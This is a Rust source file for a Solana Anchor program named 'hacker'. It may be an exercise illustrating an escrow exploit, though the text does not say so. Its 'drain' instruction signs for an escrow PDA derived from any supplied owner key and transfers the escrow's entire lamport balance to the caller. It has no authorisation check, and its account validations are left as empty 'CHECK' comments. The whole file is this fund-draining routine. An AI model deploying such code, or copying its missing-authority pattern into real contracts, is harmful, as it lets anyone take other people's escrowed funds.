use anchor_lang::prelude::*;

declare_id!("FcBBAczSDVtSwJ55RWfbGAwEQTyQ3Urh29UHi3qrFPJf");

const SEED: &[u8] = b"seed";
#[program]
pub mod hacker {
    use super::*;

    pub fn drain(ctx: Context<Drain>) -> Result<()> {
        let bump = *ctx.bumps.get("escrow_account").unwrap();
        ctx.accounts.drain_sol(bump)?;
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Drain<'info> {
    /// CHECK:
    #[account(mut,
        seeds=[SEED, owner.key().as_ref()],
        bump
    )]
    pub escrow_account: AccountInfo<'info>,
    /// CHECK:
    #[account(mut)]
    pub owner: AccountInfo<'info>,
    /// CHECK:
    #[account(mut)]
    pub hacker: Signer<'info>,
    pub system_program: Program<'info, System>,
}

impl<'info> Drain <'info> {
    fn drain_sol(&self, bump: u8) -> Result<()> {
        let authority_key = self.owner.key();
        let seed_signers = &[&[SEED, authority_key.as_ref(), bytemuck::bytes_of(&bump)][..]];

        let transfer_sol_instruction = anchor_lang::system_program::Transfer {
            from: self.escrow_account.to_account_info(),
            to: self.hacker.to_account_info(),
        };

        let cpi_ctx_sol = CpiContext::new_with_signer(
            self.system_program.to_account_info(),
            transfer_sol_instruction,
            seed_signers
        );
        anchor_lang::system_program::transfer(cpi_ctx_sol, self.escrow_account.lamports())?;

        Ok(())
    }
}